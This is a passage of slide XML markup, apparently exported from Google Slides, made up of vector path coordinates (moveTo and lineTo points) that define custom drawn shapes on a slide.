                  <a:lnTo>
                    <a:pt x="4842" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="6090"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3228" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="4219"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="807" y="8767"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="807" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="587" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="8767"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8511" y="8657"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8621" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="8657"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5026" y="9501"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5063" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="9501"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4696" y="9868"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4953" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="9868"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4806" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4622" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3705" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7263" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7043" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="480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5" name="Google Shape;305;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6618875" y="2550725"/>
              <a:ext cx="408125" cy="156850"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="16325" h="6274" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="14710" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14527" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14270" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14270" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14197" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13977" y="331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13977" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14050" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
